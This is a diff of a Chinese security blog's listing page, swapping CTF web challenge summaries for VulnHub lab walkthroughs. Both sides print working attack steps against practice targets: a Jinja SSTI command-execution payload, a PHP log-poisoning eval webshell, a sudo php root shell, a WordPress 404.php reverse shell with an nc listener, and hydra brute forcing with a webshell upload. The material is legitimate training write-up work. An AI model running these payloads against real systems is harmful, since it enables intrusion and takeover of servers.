@@ -110,98 +110,59 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">DASCTF2022九月赛</a>
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/">VulnHub — Me-and-My-Girlfriend-1</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">dino3d 一个前端小游戏
-抓包 看到/check.php 和 post 的参数，是score我们要够1000000，后面的checkCode和tm应该也要构造
-翻js源码，美化一下
-找sn() ，发现e就是source，t=checkCode ，source随便我们写
-找checkCode ，DASxCBCTF_wElc03e
-可以构造了，写个脚本
-import time import hashlib import requests url = &#34;http://node4.buuoj.cn:28130/check.php&#34; score = &#39;1000000&#39; code= &#39;DASxCBCTF_wElc03e&#39; checkCode = hashlib.md5((score+code).encode()).hexdigest() tm = int(str(time.time())[0:10]) #这里最终要为int,否则脚本跑的不好 data = { &#39;score&#39; : score, &#39;checkCode&#39; : checkCode, &#39;tm&#39; : tm } print(checkCode) print(tm) res = requests.post(url=url,data=data) print(res.text) Text Reverser SSTI 加上 一个文本逆转
-过滤了{{}} 可以试试{%print(1)%}
-进行逆转然后传参 有返回值1
-可以利用 {%print(1)%} 来进行payload构造
-lipsum这条路真的很方便
-{{lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__.os.popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)}} 直接就rce 了</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — Me-and-My-Girlfriend-1 安装好靶场镜像，打开就这样
+在kali 查自己ip 用 nmap扫描 ，看有没有其他段 ，顺利找到靶场ip
+然后访问靶场ip ，查看源码 源码提示，用X-Forwarded-For 修改成 本地ip ，直接用插件改了
+顺利进入网站 ​​​
+进入注册页面，成功注册，然后进行登录
+登录进来，观察到这里可以修改 user_id的号， 修改试试
+试出来5时候，名字是alice ，正是本题女主的名字 F12成功看到密码 用ssh 命令 进行远程登录
+格式如下，密码输入以上密码就可，然后成功连接，可以操作了 隐藏文件有个 my_secret ,访问进去 继续查看
+成功看到flag1.txt ，获得第一个flag
+这题还需要提权，查看alice的权限 ，需要用php 提权
+php 回调bash提权 sudo php -r &#39;system(&#34;/bin/bash&#34;);&#39; 权限 升为 root ，直接find flag文件啦</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--me-and-my-girlfriend-1/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">DASCTF2022十月赛</a>
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/">VulnHub — mrRobot1</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">EasyPOP 源码附上
-&lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &#34;&#34;; die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;); } } class show { public $ctf; public $time = &#34;Two and a half years&#34;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf .</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — mrRobot1 信息收集 nmap 192.168.164.0/24 22端口被关闭了 访问80网站，很像一个终端的页面
+访问robots.txt拿到第一个flag
+还有一个dic文件，访问下载下来是个字典文件
+扫描目录 发现有wordpress后台页面 sort 排序 -u 去重 sort -u fsocity.dic &amp;gt; dic.txt 将其保存为新的字典 ，去登录页面尝试用户名和密码的爆破
+用户名密码爆破 直接用burp来爆破 先爆用户名 得到是elliot
+爆出密码ER28-0652 成功登录后台 WordPress后台反弹shell 1.wordpress后台登录地址http://192.168.164.138/wordpress/wp-admin2.修改404页面，写入webshell （自行设置监听IP和端口）appearance----editer----404.php3.在攻击机上面开启监听4444端口 nc -lvpp 4444.访问404页面，反向连接到主机 （404地址固定）http://192.168.164.138/wordpress/wp-content/themes/twentyfifteen/404.php5.交互式连接python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入后台 找到编辑404页面 将webshell脚本写进去 保存 nc -lvvp 4444 然访问404.php
+连接成功 交互式连接 python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 进入home目录 就有个robot用户
+进入 发现有flag 但是没有权限查看 还有一个password MD5加密的 可以读取到 这个md5直接拿去解密</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--mrrobot1/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Dest0g3 520迎新赛</a>
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">VulnHub — NARAK</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web phpdest 日志包含 &lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) { require_once($_GET[&#39;file&#39;]); } 倒是很久没有写日志包含了
-?file=/var/log/nginx/access.logUser-Agent : &lt;?php eval($_POST[1]);?&gt; 蚁剑拿flag
-又看到个姿势require_once的多次软连接绕过
-?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHP 数组异常使用 &lt;?php highlight_file(__FILE__); include &#34;fl4g.php&#34;; $dest0g3 = $_POST[&#39;ctf&#39;]; $time = date(&#34;H&#34;); $timme = date(&#34;d&#34;); $timmme = date(&#34;i&#34;); if(($time &gt; &#34;24&#34;) or ($timme &gt; &#34;31&#34;) or ($timmme &gt; &#34;60&#34;)){ echo $fl4g; }else{ echo &#34;Try harder!&#34;; } set_error_handler( function() use(&amp;$fl4g) { print $fl4g; } ); $fl4g .= $dest0g3; ?&gt; set_error_handler () 函数设置用户定义的错误处理函数。.</div><div class="post-footer">
-        <a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/hitconctf/">hitconCTF</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">RCE nodejs，express组件
-主要源码
-const express = require(&#39;express&#39;); const cookieParser = require(&#39;cookie-parser&#39;) const crypto = require(&#39;crypto&#39;); const { ChildProcess } = require(&#39;child_process&#39;); const { access } = require(&#39;fs/promises&#39;); const randomHex = () =&gt; &#39;0123456789abcdef&#39;[~~(Math.random() * 16)]; const app = express(); app.use(cookieParser(crypto.randomBytes(20).toString(&#39;hex&#39;))); // 随机20个字节 app.get(&#39;/&#39;, function (_, res) { res.cookie(&#39;code&#39;, &#39;&#39;, { signed: true }) .sendFile(__dirname + &#39;/index.html&#39;); }); app.get(&#39;/random&#39;, function (req, res) { let result = null; if (req.signedCookies.code.length &gt;= 40) { const code = Buffer.</div><div class="post-footer">
-        <a href="/posts/ctf/hitconctf/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/hxp2022/">hxp2022</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">valentine nodejs的ssti，可以任意修改前台的模板
-app.js
-var express = require(&#39;express&#39;); var bodyParser = require(&#39;body-parser&#39;) const crypto = require(&#34;crypto&#34;); var path = require(&#39;path&#39;); const fs = require(&#39;fs&#39;); var app = express(); viewsFolder = path.join(__dirname, &#39;views&#39;); if (!fs.existsSync(viewsFolder)) { fs.mkdirSync(viewsFolder); } app.set(&#39;views&#39;, viewsFolder); app.set(&#39;view engine&#39;, &#39;ejs&#39;); app.use(bodyParser.urlencoded({ extended: false })) app.post(&#39;/template&#39;, function(req, res) { let tmpl = req.body.tmpl; let i = -1; while((i = tmpl.indexOf(&#34;&lt;%&#34;, i+1)) &gt;= 0) { if (tmpl.substring(i, i+11) !== &#34;&lt;%= name %&gt;&#34;) { res.</div><div class="post-footer">
-        <a href="/posts/ctf/hxp2022/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/newstarctf-web/">NewStarCTF-web</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week1 HTTP cookie 修改admin 源码发现key GET和POST传参即可
-Head?Header! User-Agent: CTFReferer: ctf.comX-Forwarded-For: 127.0.0.1 我真的会谢 信息泄露
-robots.txt
-www.zip
-源码 + /.index.php.swp
-NotPHP 函数绕过 if(file_get_contents($_GET[&#39;data&#39;]) == &#34;Welcome to CTF&#34;){ if(md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]){ if(!is_numeric($_POST[&#39;num&#39;]) &amp;&amp; intval($_POST[&#39;num&#39;]) == 2077){ echo &#34;Hack Me&#34;; eval(&#34;#&#34;.$_GET[&#39;cmd&#39;]); }else{ die(&#34;Number error!&#34;); } }else{ die(&#34;Wrong Key!&#34;); } }else{ die(&#34;Pass it!&#34;); 1,绕过file_get_contents()，用input伪协议，即 /?data=php://input POST一个Welcome to CTF
-用data协议绕，?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=
-2,md5强比较碰撞&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 这里可以直接数组绕过 key1[]=1&amp;key2[]=2
-3，绕数字判断，intval只取前面的数字，后面的字母会忽略
-num=2077abc
-4，绕# 命令执行，用回车符%0d，我用换行符%0a打不通不知道为啥
-&amp;cmd=%0dsystem(&quot;ls /&quot;); 在bp里需要URL编码进去rec</div><div class="post-footer">
-        <a href="/posts/ctf/newstarctf-web/">Read More</a><div class="post-tags">
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — NARAK Objective: Find 2 flags (user.txt and root.txt)
+nmap 扫出来靶场ip 和开放端口 浏览器访问 ，一堆这个关于题目背景的地狱图片 ，没有什么信息
+扫描一下目录 ，dirsearch 和 dirb都用了一下 ，dirmap倒是没出来
+访问webdav 有东西 **cadaver —— webdav客户端使用 ** cadaver http://192.168.164.130/webdav //连接put webshell.php //上传 cewl —— 爬行网站创建密码字典 通过爬取网站获得关键词信息，创建一个密码字典cewl http://192.168.164.130/ -w 1.txt hydra —— 爆破神器，支持众多协议的自动化爆破 hydra -L 1.txt -P 1.txt 192.168.164.130 http-get /webdav -L 用户名 -P 密码 ip地址 协议 路径 爆破出 用户名密码了，就可以cadaver 进行连接了 连接上，可以 put 一个 webshell ，成功后
+nc ——监听 nc -lvvp 4444(webshell设置端口) 然后用刚才的用户名密码 登录这个webshell</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--narak/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
                     </span>
                 </li><li class="page-item ">
-                    <span class="page-link">
-                        <a href="/page/2/">2</a>
-                    </span>
-                </li><li class="page-item ">
-                    <span class="page-link">
-                        <a href="/page/3/">3</a>
-                    </span>
-                </li><li class="page-item active">
-                    <span class="page-link">
-                        <a href="/page/4/">4</a>
-                    </span>
-                </li><li class="page-item ">
-                    <span class="page-link">
-                        <a href="/page/5/">5</a>
-                    </span>
-                </li><li class="page-item ">
-                    <span class="page-link">
-                        <a href="/page/6/">6</a>
-                    </span>
-                </li><li class="page-item ">
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/7/">7</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/8/">8</a>
+                    </span>
+                </li><li class="page-item active">
                     <span class="page-link">
                         <a href="/page/9/">9</a>
                     </span>
